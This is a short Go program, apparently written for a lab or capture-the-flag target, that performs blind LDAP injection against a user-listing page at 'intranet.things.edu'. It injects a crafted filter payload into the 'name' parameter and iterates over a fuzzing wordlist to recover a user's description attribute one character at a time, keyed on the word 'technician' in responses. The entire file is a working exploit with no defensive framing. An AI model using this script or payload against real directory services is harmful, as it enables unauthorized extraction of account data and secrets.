package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

//
//
//

func main() {
	// Prompt user for wordlist input
	fmt.Print("Enter the wordlist or charset (press Enter to use the default): ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	charsetPath := strings.TrimSpace(scanner.Text())

	// Use default wordlist if user didn't provide one
	if charsetPath == "" {
		charsetPath = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"
	}

	baseURL := "http://intranet.things.edu/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
	foundChars := ""

	file, err := os.Open(charsetPath)
	if err != nil {
		fmt.Println("Error opening charset file:", err)
		return
	}
	defer file.Close()

	scanner = bufio.NewScanner(file)
	for scanner.Scan() {
		char := strings.TrimSpace(scanner.Text())
		//fmt.Println("Trying character:", char)
		//thisisthat := "OnlyWorkingInput:"
		
		modifiedURL := strings.Replace(baseURL, "{FUZZ}", char, 1)
		modifiedURL = strings.Replace(modifiedURL, "{found_char}", foundChars, 1)
		fmt.Println("Modified URL:", modifiedURL)
		//fmt.Println(thisisthat,"{found_char}",foundChars, 1)
		
		response, err := http.Get(modifiedURL)
		if err != nil {
			fmt.Println("Error making HTTP request:", err)
			return
		}
		defer response.Body.Close()

		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			return
		}

		if strings.Contains(response.Status, "200 OK") && strings.Contains(string(body), "technician") {
			fmt.Println("Found character:", char)
			foundChars += char
			file.Seek(0, 0) // Move the file pointer to the beginning for another iteration
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading charset file:", err)
		return
	}

	fmt.Println("Final found characters:", foundChars)
}

//
//
//
